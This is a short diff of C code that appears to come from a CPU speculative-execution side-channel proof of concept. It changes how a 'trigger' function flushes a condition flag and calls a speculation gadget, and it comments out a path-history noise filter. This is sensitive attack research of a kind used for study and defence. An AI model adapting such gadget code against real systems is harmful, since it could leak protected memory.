@@ -61,13 +61,11 @@ uint64_t setup_trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
 
 uint64_t trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
   // Trigger page walk
-  arch_exec = 1; // Changing condition value
+  arch_exec = 0; // Changing condition value
   _mm_mfence();
   _mm_clflush((void *)&arch_exec); // Flushing
-  if (phase) {
-    unmasked_gadget(signal_function, ~0x7fff000000000000,
-                    1); // Calling the gadget
-  }
+  unmasked_gadget(NULL, ~0x7fff000000000000,
+                  phase); // Calling the gadget
   return __trash;
 }
 
@@ -137,7 +135,7 @@ int main(void) {
 
   filter_function((uint64_t)unmasked_gadget, init_noise_filter);
   filter_function((uint64_t)clear_phr, init_noise_filter);
-  filter_function((uint64_t)set_phr, init_noise_filter);
+  // filter_function((uint64_t)set_phr, init_noise_filter);
   set_noise_filter(init_noise_filter);
 
   uint64_t val = *(uint64_t *)signal_function;
